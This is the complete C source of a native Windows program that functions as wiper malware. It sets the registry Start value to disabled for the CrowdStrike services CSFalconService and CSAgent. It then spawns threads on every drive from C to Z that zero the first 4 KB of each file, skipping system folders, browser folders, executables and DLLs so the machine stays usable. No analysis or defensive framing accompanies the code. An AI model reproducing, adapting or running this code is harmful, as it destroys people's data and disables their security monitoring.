#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>

#pragma comment(lib, "ntdll.lib")

//
// File Information Structures
//
typedef struct _FILE_STANDARD_INFORMATION {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG NumberOfLinks;
    BOOLEAN DeletePending;
    BOOLEAN Directory;
} FILE_STANDARD_INFORMATION, * PFILE_STANDARD_INFORMATION;

typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, * PFILE_DIRECTORY_INFORMATION;

typedef struct _KEY_BASIC_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG TitleIndex;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_BASIC_INFORMATION, * PKEY_BASIC_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataLength;
    UCHAR Data[1];
} KEY_VALUE_PARTIAL_INFORMATION, * PKEY_VALUE_PARTIAL_INFORMATION;

typedef struct _QUEUE_ITEM {
    struct _QUEUE_ITEM* Next;
    UNICODE_STRING Path;
} QUEUE_ITEM, * PQUEUE_ITEM;

typedef struct _QUEUE {
    PQUEUE_ITEM Head;
    PQUEUE_ITEM Tail;
    RTL_SRWLOCK Lock;
    RTL_CONDITION_VARIABLE NonEmpty;
} QUEUE, * PQUEUE;

//
// Enumerations
//
typedef enum _WAIT_TYPE {
    WaitAll,
    WaitAny,
    WaitNotification
} WAIT_TYPE;

typedef enum _KEY_INFORMATION_CLASS {
    KeyBasicInformation,
    KeyNodeInformation,
    KeyFullInformation,
    KeyNameInformation,
    KeyCachedInformation,
    KeyFlagsInformation,
    KeyVirtualizationInformation,
    KeyHandleTagsInformation,
    KeyTrustInformation,
    KeyLayerInformation,
    MaxKeyInfoClass
} KEY_INFORMATION_CLASS;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation,
    KeyValueFullInformation,
    KeyValuePartialInformation,
    KeyValueFullInformationAlign64,
    KeyValuePartialInformationAlign64,
    KeyValueLayerInformation,
    MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

//
// External Declarations
//
extern VOID NTAPI RtlInitializeSRWLock(PRTL_SRWLOCK SRWLock);
extern VOID NTAPI RtlAcquireSRWLockExclusive(PRTL_SRWLOCK SRWLock);
extern VOID NTAPI RtlWakeAllConditionVariable(PRTL_CONDITION_VARIABLE ConditionVariable);
extern VOID NTAPI RtlReleaseSRWLockExclusive(PRTL_SRWLOCK SRWLock);
extern VOID NTAPI RtlSleepConditionVariableSRW(PRTL_CONDITION_VARIABLE ConditionVariable, PRTL_SRWLOCK SRWLock, PLARGE_INTEGER Timeout, ULONG Flags);
extern VOID NTAPI RtlInitializeConditionVariable(PRTL_CONDITION_VARIABLE ConditionVariable);
extern PVOID NTAPI RtlAllocateHeap(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
extern VOID NTAPI RtlFreeHeap(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
extern PVOID NTAPI RtlCreateHeap(ULONG Flags, PVOID HeapBase, SIZE_T ReserveSize, SIZE_T CommitSize, PVOID Lock, PVOID Parameters);
extern WCHAR NTAPI RtlUpcaseUnicodeChar(WCHAR SourceCharacter);

extern NTSTATUS NTAPI NtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions);
extern NTSTATUS NTAPI NtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
extern NTSTATUS NTAPI NtQueryInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
extern NTSTATUS NTAPI NtWriteFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
extern NTSTATUS NTAPI NtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength);
extern NTSTATUS NTAPI NtSetValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, ULONG TitleIndex, ULONG Type, PVOID Data, ULONG DataSize);
extern NTSTATUS NTAPI NtOpenKey(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
extern NTSTATUS NTAPI NtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength);
extern NTSTATUS NTAPI NtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus);
extern NTSTATUS NTAPI RtlCreateUserThread(HANDLE ProcessHandle, PSECURITY_DESCRIPTOR SecurityDescriptor, BOOLEAN CreateSuspended, ULONG StackZeroBits, PULONG StackReserve, PULONG StackCommit, PTHREAD_START_ROUTINE StartAddress, PVOID Parameter, PHANDLE ThreadHandle, PVOID ClientId);
extern NTSTATUS NTAPI NtWaitForMultipleObjects(ULONG Count, HANDLE Handles[], WAIT_TYPE WaitType, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
extern NTSTATUS NTAPI NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
extern NTSTATUS NTAPI RtlAppendUnicodeToString(PUNICODE_STRING Destination, PCWSTR Source);
extern NTSTATUS NTAPI NtClose(HANDLE Handle);

#pragma function(memcpy)
#pragma function(memset)



//
// Macros and Globals
//
#define FileStandardInformation 5
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define NtCurrentPeb() ((PEB*)__readgsqword(0x60))

static __forceinline void LocalCopyMemory(PVOID Destination, const void* Source, SIZE_T Length) {
    unsigned char* d = (unsigned char*)Destination;
    const unsigned char* s = (const unsigned char*)Source;
    while (Length--) *d++ = *s++;
}

static __forceinline void LocalFillMemory(PVOID Destination, SIZE_T Length, unsigned char Fill) {
    unsigned char* d = (unsigned char*)Destination;
    while (Length--) *d++ = Fill;
}

static __forceinline void LocalZeroMemory(PVOID Destination, SIZE_T Length) {
    LocalFillMemory(Destination, Length, 0);
}

void* __cdecl memcpy(void* dest, const void* src, size_t count) {
    LocalCopyMemory(dest, src, count);
    return dest;
}

void* __cdecl memset(void* dest, int c, size_t count) {
    LocalFillMemory(dest, (SIZE_T)count, (unsigned char)c);
    return dest;
}

static SIZE_T LocalStringLength(const WCHAR* str) {
    const WCHAR* start = str;
    while (*str) str++;
    return (SIZE_T)(str - start);
}

#define RtlInitUnicodeString(Destination, Source) \
    ((Destination)->Buffer = (Source), \
     (Destination)->Length = (USHORT)(LocalStringLength(Source) * sizeof(WCHAR)), \
     (Destination)->MaximumLength = (Destination)->Length + sizeof(WCHAR))

//
// Global Variables
//
PVOID g_Heap;
QUEUE g_DirectoryQueue;
QUEUE g_FileQueue;
LONG g_OutstandingDirectories = 0;
BOOLEAN g_Done = FALSE;

static const WCHAR ServicesPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services";

static const WCHAR* black[] = {
    0, L"AppData", L"Boot", L"Windows", L"Windows.old",
    L"Tor Browser", L"Internet Explorer", L"Google", L"Opera",
    L"Opera Software", L"Mozilla", L"Mozilla Firefox", L"$Recycle.Bin",
    L"ProgramData", L"All Users", L"autorun.inf", L"boot.ini", L"bootfont.bin",
    L"bootsect.bak", L"bootmgr", L"bootmgr.efi", L"bootmgfw.efi", L"desktop.ini",
    L"iconcache.db", L"ntldr", L"ntuser.dat", L"ntuser.dat.log", L"ntuser.ini", L"thumbs.db",
    L"Program Files", L"Program Files (x86)", L"#recycle", L"..", L"."
};

static const WCHAR* services[] = {
    L"CSFalconService", L"CSAgent"
};

//
// Utility Functions
//
int _wcsicmp(const WCHAR* s1, const WCHAR* s2) {
    while (*s1 && *s2) {
        WCHAR c1 = RtlUpcaseUnicodeChar(*s1);
        WCHAR c2 = RtlUpcaseUnicodeChar(*s2);
        if (c1 != c2) return (c1 < c2) ? -1 : 1;
        s1++;
        s2++;
    }
    if (*s1 == *s2) return 0;
    return (*s1 == L'\0') ? -1 : 1;
}

WCHAR* _wcsrchr(const WCHAR* str, WCHAR ch) {
    const WCHAR* last = NULL;
    for (const WCHAR* p = str; *p; p++) {
        if (*p == ch) last = p;
    }
    return (WCHAR*)last;
}

BOOLEAN ShouldSkipName(PCWSTR FileName, ULONG NameLength, BOOLEAN IsDirectory) {
    WCHAR tempName[260];
    ULONG copyLength = (NameLength < 259) ? NameLength : 259;
    LocalCopyMemory(tempName, FileName, copyLength * sizeof(WCHAR));
    tempName[copyLength] = L'\0';

    for (int i = 1; i < (int)(sizeof(black) / sizeof(black[0])); i++) {
        if (_wcsicmp(tempName, black[i]) == 0) return TRUE;
    }

    if (!IsDirectory) {
        WCHAR* ext = _wcsrchr(tempName, L'.');
        if (ext) {
            if ((_wcsicmp(ext, L".exe") == 0) || (_wcsicmp(ext, L".dll") == 0))
                return TRUE;
        }
    }
    return FALSE;
}

//
// Queue Operations
//
VOID InitQueue(PQUEUE Q) {
    Q->Head = Q->Tail = NULL;
    RtlInitializeSRWLock(&Q->Lock);
    RtlInitializeConditionVariable(&Q->NonEmpty);
}

VOID Enqueue(PQUEUE Q, PQUEUE_ITEM Item) {
    RtlAcquireSRWLockExclusive(&Q->Lock);
    Item->Next = NULL;
    if (Q->Tail) {
        Q->Tail->Next = Item;
    }
    else {
        Q->Head = Item;
    }
    Q->Tail = Item;
    RtlWakeAllConditionVariable(&Q->NonEmpty);
    RtlReleaseSRWLockExclusive(&Q->Lock);
}

PQUEUE_ITEM DequeueWithWait(PQUEUE Q, PLONG pOutstandingDirs) {
    RtlAcquireSRWLockExclusive(&Q->Lock);
    while (!Q->Head && !g_Done) {
        RtlSleepConditionVariableSRW(&Q->NonEmpty, &Q->Lock, NULL, 0);
    }

    if (g_Done && !Q->Head) {
        RtlReleaseSRWLockExclusive(&Q->Lock);
        return NULL;
    }

    PQUEUE_ITEM Item = Q->Head;
    if (Item) {
        Q->Head = Item->Next;
        if (!Q->Head) Q->Tail = NULL;
    }

    RtlReleaseSRWLockExclusive(&Q->Lock);
    return Item;
}

PQUEUE_ITEM Dequeue(PQUEUE Q) {
    RtlAcquireSRWLockExclusive(&Q->Lock);
    PQUEUE_ITEM Item = Q->Head;
    if (Item) {
        Q->Head = Item->Next;
        if (!Q->Head) Q->Tail = NULL;
    }
    RtlReleaseSRWLockExclusive(&Q->Lock);
    return Item;
}

//
// Registry Utilities
//
NTSTATUS QueryDwordValue(HANDLE KeyHandle, PCWSTR ValueName, PULONG Result) {
    UNICODE_STRING valName;
    RtlInitUnicodeString(&valName, ValueName);

    BYTE buffer[512];
    PKEY_VALUE_PARTIAL_INFORMATION kvpi = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;
    ULONG retLen;

    NTSTATUS status = NtQueryValueKey(
        KeyHandle, &valName, KeyValuePartialInformation,
        kvpi, sizeof(buffer), &retLen
    );
    if (!NT_SUCCESS(status)) return status;

    if (kvpi->Type != REG_DWORD || kvpi->DataLength < sizeof(ULONG)) return STATUS_OBJECT_TYPE_MISMATCH;
    *Result = *(ULONG*)kvpi->Data;
    return STATUS_SUCCESS;
}

NTSTATUS SetDwordValue(HANDLE KeyHandle, PCWSTR ValueName, ULONG Value) {
    UNICODE_STRING valName;
    RtlInitUnicodeString(&valName, ValueName);
    return NtSetValueKey(KeyHandle, &valName, 0, REG_DWORD, &Value, sizeof(Value));
}

//
// Directory and File Handling
//
NTSTATUS EnumerateDirectory(PCUNICODE_STRING DirectoryPath) {
    NTSTATUS status;
    HANDLE hDir;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;

    InitializeObjectAttributes(&oa, (PUNICODE_STRING)DirectoryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = NtOpenFile(&hDir, FILE_LIST_DIRECTORY | SYNCHRONIZE, &oa, &iosb,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
    if (!NT_SUCCESS(status)) return status;

    BYTE* buffer = (BYTE*)RtlAllocateHeap(g_Heap, 0, 4096);
    if (!buffer) {
        NtClose(hDir);
        return STATUS_NO_MEMORY;
    }

    PFILE_DIRECTORY_INFORMATION fdi = (PFILE_DIRECTORY_INFORMATION)buffer;
    for (;;) {
        LocalZeroMemory(buffer, 4096);
        status = NtQueryDirectoryFile(hDir, NULL, NULL, NULL, &iosb, fdi, 4096,
            FileDirectoryInformation, FALSE, NULL, FALSE);
        if (status == STATUS_NO_MORE_FILES) {
            status = STATUS_SUCCESS;
            break;
        }
        if (!NT_SUCCESS(status)) break;

        PBYTE ptr = (PBYTE)fdi;
        for (;;) {
            PFILE_DIRECTORY_INFORMATION entry = (PFILE_DIRECTORY_INFORMATION)ptr;
            BOOLEAN isDir = (entry->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? TRUE : FALSE;
            if (ShouldSkipName(entry->FileName, entry->FileNameLength / sizeof(WCHAR), isDir)) {
                if (entry->NextEntryOffset == 0) break;
                ptr += entry->NextEntryOffset;
                continue;
            }

            ULONG baseLen = DirectoryPath->Length / sizeof(WCHAR);
            BOOLEAN endsWithBackslash = (baseLen > 0 && DirectoryPath->Buffer[baseLen - 1] == L'\\');
            ULONG newLen = DirectoryPath->Length + entry->FileNameLength + (endsWithBackslash ? 0 : sizeof(WCHAR));

            PWCH fullPathBuf = (PWCH)RtlAllocateHeap(g_Heap, 0, newLen + sizeof(WCHAR));
            if (!fullPathBuf) {
                status = STATUS_NO_MEMORY;
                break;
            }

            LocalCopyMemory(fullPathBuf, DirectoryPath->Buffer, DirectoryPath->Length);
            if (!endsWithBackslash) {
                fullPathBuf[baseLen] = L'\\';
                LocalCopyMemory(&fullPathBuf[baseLen + 1], entry->FileName, entry->FileNameLength);
                fullPathBuf[newLen / sizeof(WCHAR)] = L'\0';
            }
            else {
                LocalCopyMemory(&fullPathBuf[baseLen], entry->FileName, entry->FileNameLength);
                fullPathBuf[newLen / sizeof(WCHAR)] = L'\0';
            }

            QUEUE_ITEM* newItem = (QUEUE_ITEM*)RtlAllocateHeap(g_Heap, HEAP_ZERO_MEMORY, sizeof(QUEUE_ITEM));
            if (!newItem) {
                RtlFreeHeap(g_Heap, 0, fullPathBuf);
                status = STATUS_NO_MEMORY;
                break;
            }

            newItem->Path.Buffer = fullPathBuf;
            newItem->Path.Length = (USHORT)newLen;
            newItem->Path.MaximumLength = (USHORT)(newLen + sizeof(WCHAR));

            if (isDir) {
                InterlockedIncrement(&g_OutstandingDirectories);
                Enqueue(&g_DirectoryQueue, newItem);
            }
            else {
                Enqueue(&g_FileQueue, newItem);
            }

            if (entry->NextEntryOffset == 0) break;
            ptr += entry->NextEntryOffset;
        }

        if (!NT_SUCCESS(status)) break;
    }

    NtClose(hDir);
    RtlFreeHeap(g_Heap, 0, buffer);
    return status;
}

void HandleFile(PUNICODE_STRING Path) {
    HANDLE hFile = NULL;
    IO_STATUS_BLOCK iosb;
    FILE_STANDARD_INFORMATION fsi;
    LARGE_INTEGER offset;
    NTSTATUS status;
    BYTE* zeroBuffer = (BYTE*)RtlAllocateHeap(g_Heap, HEAP_ZERO_MEMORY, 4096);

    if (!zeroBuffer) return;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, Path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(status)) goto cleanup;

    status = NtQueryInformationFile(hFile, &iosb, &fsi, sizeof(fsi), FileStandardInformation);
    if (!NT_SUCCESS(status)) goto cleanup;

    if (fsi.EndOfFile.QuadPart > 0) {
        ULONG writeLen = (ULONG)((fsi.EndOfFile.QuadPart < 4096) ? fsi.EndOfFile.QuadPart : 4096);
        offset.QuadPart = 0;
        NtWriteFile(hFile, NULL, NULL, NULL, &iosb, zeroBuffer, writeLen, &offset, NULL);
    }

cleanup:
    if (zeroBuffer) RtlFreeHeap(g_Heap, 0, zeroBuffer);
    if (hFile) NtClose(hFile);
}

//
// Thread Functions
//
NTSTATUS DirectoryWorkerThread(PVOID Context) {
    UNREFERENCED_PARAMETER(Context);

    for (;;) {
        PQUEUE_ITEM item = DequeueWithWait(&g_DirectoryQueue, &g_OutstandingDirectories);
        if (!item) {
            RtlAcquireSRWLockExclusive(&g_DirectoryQueue.Lock);
            BOOLEAN done = g_Done;
            RtlReleaseSRWLockExclusive(&g_DirectoryQueue.Lock);
            if (done) break;
            continue;
        }

        EnumerateDirectory(&item->Path);
        LONG newCount = InterlockedDecrement(&g_OutstandingDirectories);

        RtlFreeHeap(g_Heap, 0, item->Path.Buffer);
        RtlFreeHeap(g_Heap, 0, item);

        RtlAcquireSRWLockExclusive(&g_DirectoryQueue.Lock);
        if (newCount == 0 && g_DirectoryQueue.Head == NULL) {
            g_Done = TRUE;
            RtlWakeAllConditionVariable(&g_DirectoryQueue.NonEmpty);
        }
        RtlReleaseSRWLockExclusive(&g_DirectoryQueue.Lock);

        if (g_Done) break;
    }

    return STATUS_SUCCESS;
}

NTSTATUS FileConsumerThread(PVOID Context) {
    UNREFERENCED_PARAMETER(Context);

    for (;;) {
        RtlAcquireSRWLockExclusive(&g_FileQueue.Lock);
        while (!g_FileQueue.Head && !g_Done) {
            RtlSleepConditionVariableSRW(&g_FileQueue.NonEmpty, &g_FileQueue.Lock, NULL, 0);
        }

        PQUEUE_ITEM item = g_FileQueue.Head;
        if (item) {
            g_FileQueue.Head = item->Next;
            if (!g_FileQueue.Head) g_FileQueue.Tail = NULL;
        }
        RtlReleaseSRWLockExclusive(&g_FileQueue.Lock);

        if (!item) {
            if (g_Done) break;
            continue;
        }

        HandleFile(&item->Path);
        RtlFreeHeap(g_Heap, 0, item->Path.Buffer);
        RtlFreeHeap(g_Heap, 0, item);

        if (g_Done) {
            RtlAcquireSRWLockExclusive(&g_FileQueue.Lock);
            BOOLEAN empty = (g_FileQueue.Head == NULL);
            RtlReleaseSRWLockExclusive(&g_FileQueue.Lock);
            if (empty) break;
        }
    }

    return STATUS_SUCCESS;
}

//
// Service Enumeration
//
NTSTATUS EnumerateServicesAndSetManual() {
    UNICODE_STRING servicesKeyName;
    RtlInitUnicodeString(&servicesKeyName, ServicesPath);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &servicesKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hServices;
    NTSTATUS status = NtOpenKey(&hServices, KEY_READ, &oa);
    if (!NT_SUCCESS(status)) return status;

    ULONG index = 0;

    for (;;) {
        BYTE* buffer = NULL;
        PWCH fullBuf = NULL;
        BOOLEAN present = FALSE;

        buffer = (BYTE*)RtlAllocateHeap(g_Heap, 0, 4096);
        if (!buffer) {
            status = STATUS_NO_MEMORY;
            goto service_cleanup;
        }

        PKEY_BASIC_INFORMATION kbi = (PKEY_BASIC_INFORMATION)buffer;
        ULONG retLen = 0;

        status = NtEnumerateKey(hServices, index, KeyBasicInformation, kbi, 4096, &retLen);
        if (!NT_SUCCESS(status) || status == STATUS_NO_MORE_ENTRIES) {
            // No more services or failed
            goto service_cleanup;
        }

        USHORT serviceNameLen = (USHORT)kbi->NameLength;
        USHORT charsCount = serviceNameLen / sizeof(WCHAR);
        if (charsCount > 259) charsCount = 259;
        WCHAR serviceNameBuf[260];
        LocalCopyMemory(serviceNameBuf, kbi->Name, charsCount * sizeof(WCHAR));
        serviceNameBuf[charsCount] = L'\0';

        for (int i = 0; i < (int)(sizeof(services) / sizeof(services[0])); i++) {
            if (_wcsicmp(serviceNameBuf, services[i]) == 0) {
                present = TRUE;
                break;
            }
        }

        if (present) {
            UNICODE_STRING basePath;
            RtlInitUnicodeString(&basePath, ServicesPath);

            USHORT totalLen = basePath.Length + sizeof(WCHAR) + serviceNameLen;
            fullBuf = (PWCH)RtlAllocateHeap(g_Heap, 0, totalLen + sizeof(WCHAR));
            if (!fullBuf) {
                status = STATUS_NO_MEMORY;
                goto service_cleanup;
            }

            LocalCopyMemory(fullBuf, basePath.Buffer, basePath.Length);
            fullBuf[basePath.Length / sizeof(WCHAR)] = L'\\';
            LocalCopyMemory(&fullBuf[(basePath.Length / sizeof(WCHAR)) + 1], kbi->Name, serviceNameLen);
            fullBuf[totalLen / sizeof(WCHAR)] = L'\0';

            UNICODE_STRING serviceKeyName;
            serviceKeyName.Buffer = fullBuf;
            serviceKeyName.Length = totalLen;
            serviceKeyName.MaximumLength = totalLen + sizeof(WCHAR);

            OBJECT_ATTRIBUTES svcOa;
            InitializeObjectAttributes(&svcOa, &serviceKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

            HANDLE hService;
            NTSTATUS openStatus = NtOpenKey(&hService, KEY_READ | KEY_WRITE, &svcOa);

            if (NT_SUCCESS(openStatus)) {
                // Set Start to 4 (Disabled)
                SetDwordValue(hService, L"Start", 4);
                NtClose(hService);
            }
        }

    service_cleanup:
        if (fullBuf) RtlFreeHeap(g_Heap, 0, fullBuf);
        if (buffer) RtlFreeHeap(g_Heap, 0, buffer);

        if (!NT_SUCCESS(status) || status == STATUS_NO_MORE_ENTRIES) {
            break;
        }

        index++;
    }

    NtClose(hServices);
    return (status == STATUS_NO_MORE_ENTRIES) ? STATUS_SUCCESS : status;
}

//
// Drive Enumeration
//
NTSTATUS EnqueueExistingDrives() {
    WCHAR driveRootBuf[16];
    UNICODE_STRING driveRoot;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    NTSTATUS status = STATUS_SUCCESS;

    for (WCHAR letter = L'C'; letter <= L'Z'; letter++) {
        driveRoot.Length = 0;
        driveRoot.MaximumLength = sizeof(driveRootBuf);
        driveRoot.Buffer = driveRootBuf;

        RtlAppendUnicodeToString(&driveRoot, L"\\??\\");
        WCHAR letterStr[3] = { letter, L':', 0 };
        RtlAppendUnicodeToString(&driveRoot, letterStr);
        RtlAppendUnicodeToString(&driveRoot, L"\\");

        InitializeObjectAttributes(&oa, &driveRoot, OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE hFile;
        NTSTATUS openStatus = NtOpenFile(
            &hFile,
            FILE_LIST_DIRECTORY | SYNCHRONIZE,
            &oa,
            &iosb,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
        );
        if (NT_SUCCESS(openStatus)) {
            NtClose(hFile);

            PQUEUE_ITEM dItem = (PQUEUE_ITEM)RtlAllocateHeap(g_Heap, HEAP_ZERO_MEMORY, sizeof(QUEUE_ITEM));
            if (!dItem) {
                status = STATUS_NO_MEMORY;
                break;
            }

            dItem->Path.Buffer = (PWCH)RtlAllocateHeap(g_Heap, HEAP_ZERO_MEMORY, driveRoot.Length + sizeof(WCHAR));
            if (!dItem->Path.Buffer) {
                RtlFreeHeap(g_Heap, 0, dItem);
                status = STATUS_NO_MEMORY;
                break;
            }

            dItem->Path.Length = driveRoot.Length;
            dItem->Path.MaximumLength = driveRoot.Length + sizeof(WCHAR);
            LocalCopyMemory(dItem->Path.Buffer, driveRoot.Buffer, driveRoot.Length);
            dItem->Path.Buffer[driveRoot.Length / sizeof(WCHAR)] = L'\0';

            InterlockedIncrement(&g_OutstandingDirectories);
            Enqueue(&g_DirectoryQueue, dItem);
        }
    }

    return status;
}

ULONG GetProcessorCount() {
    SYSTEM_BASIC_INFORMATION sbi;
    NTSTATUS status = NtQuerySystemInformation(SystemBasicInformation, &sbi, sizeof(sbi), NULL);
    return NT_SUCCESS(status) ? sbi.NumberOfProcessors : 1;
}

//
// Entry Point
//
extern void NtProcessStartup() {
    g_Heap = RtlCreateHeap(HEAP_GROWABLE, NULL, 0, 0, NULL, NULL);
    InitQueue(&g_DirectoryQueue);
    InitQueue(&g_FileQueue);

    EnumerateServicesAndSetManual();

    ULONG NumProcs = GetProcessorCount();
    ULONG g_DirThreadCount = NumProcs;
    ULONG g_FileThreadCount = NumProcs;

    if (!NT_SUCCESS(EnqueueExistingDrives())) {
        NtTerminateProcess(NtCurrentProcess(), STATUS_UNSUCCESSFUL);
    }

    HANDLE* dirThreads = (HANDLE*)RtlAllocateHeap(g_Heap, 0, sizeof(HANDLE) * g_DirThreadCount);
    for (ULONG i = 0; i < g_DirThreadCount; i++) {
        HANDLE hThread;
        RtlCreateUserThread(NtCurrentProcess(), NULL, FALSE, 0, 0, 0, DirectoryWorkerThread, NULL, &hThread, NULL);
        dirThreads[i] = hThread;
    }

    HANDLE* fileThreads = (HANDLE*)RtlAllocateHeap(g_Heap, 0, sizeof(HANDLE) * g_FileThreadCount);
    for (ULONG i = 0; i < g_FileThreadCount; i++) {
        HANDLE hThread;
        RtlCreateUserThread(NtCurrentProcess(), NULL, FALSE, 0, 0, 0, FileConsumerThread, NULL, &hThread, NULL);
        fileThreads[i] = hThread;
    }

    NtWaitForMultipleObjects(g_DirThreadCount, dirThreads, WaitAll, FALSE, NULL);
    NtWaitForMultipleObjects(g_FileThreadCount, fileThreads, WaitAll, FALSE, NULL);

    for (ULONG i = 0; i < g_DirThreadCount; i++) {
        NtClose(dirThreads[i]);
    }
    for (ULONG i = 0; i < g_FileThreadCount; i++) {
        NtClose(fileThreads[i]);
    }

    RtlFreeHeap(g_Heap, 0, dirThreads);
    RtlFreeHeap(g_Heap, 0, fileThreads);

    NtTerminateProcess(NtCurrentProcess(), STATUS_SUCCESS);
}
